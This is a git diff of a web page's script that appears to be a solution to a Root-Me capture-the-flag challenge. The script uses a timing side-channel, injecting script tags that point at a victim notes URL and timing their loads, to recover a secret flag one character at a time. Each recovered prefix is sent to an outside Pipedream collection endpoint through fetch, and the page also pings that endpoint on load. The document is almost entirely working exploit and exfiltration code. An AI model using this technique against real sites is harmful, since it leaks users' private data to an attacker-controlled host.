@@ -24,39 +24,37 @@
     </script> -->
     <script defer="">
         fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?presence=JeSuisLa`)
-        let cnt = 0
         let alpha = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+="
+        let flag = "z"
+        let endpoint = "https://eoba3aqmrw0ajf6.m.pipedream.net/?flag="
+        let victime = "https://web-client-ch56.challenge01.root-me.org:58056/notes/4396/"
 
-        function test() {
-            this.flag = "z"
-            for (let i = 0; i < 50; i++) {
 
+        function leak(url, i) {
+            // declaration du script
+            let s = document.createElement('script')
+            s.src = `${victime}${flag}${alpha[i]}`
+            document.body.appendChild(s)
 
-                // declaration du script
-                let s = document.createElement('script')
-                s.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${4396}/${this.flag}${alpha[i]}`
-                document.body.appendChild(s)
+            var start = performance.now()
 
-                var start = performance.now()
-
-                s.onload = () => {
-                    var time = performance.now() - start;
-                    console.log("The request took %d ms.", time);
-                    if (time >= 2000) {
-                        //fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?lettre=${alpha[i]}&temps=${time}ms`)
-                        this.flag += alpha[i];
-                        if (cnt > 5)
-                            fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?flag=${this.flag}`)
-                    }
-
+            s.onload = () => {
+                var time = performance.now() - start;
+                console.log("The request took %d ms.", time);
+                if (time >= 2000) {
+                    //fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?lettre=${alpha[i]}&temps=${time}ms`)
+                    flag = flag + alpha[i]
+                    fetch(`${endpoint}${flag}`)
+                    leak(victime, 0)
+                } else if (i < alpha.length - 1) {
+                    leak(victime, i + 1)
                 }
 
             }
         }
-        while (cnt != 8) {
-            test()
-            cnt++
-        }
+        leak(victime, 0)
+
+
 
 
 
